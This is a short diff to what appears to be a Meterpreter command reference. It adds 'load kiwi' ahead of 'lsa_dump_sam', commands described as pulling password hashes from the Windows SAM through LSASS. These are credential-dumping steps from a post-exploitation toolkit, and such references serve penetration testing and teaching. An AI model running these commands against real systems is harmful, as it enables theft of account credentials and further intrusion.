@@ -775,6 +775,7 @@ meterpreter > hashdump
 Extracts and displays password hashes from the Security Account Manager (SAM) via the LSASS process.
 
 ```bash
+meterpreter > load kiwi
 meterpreter > lsa_dump_sam
 ``` 
 
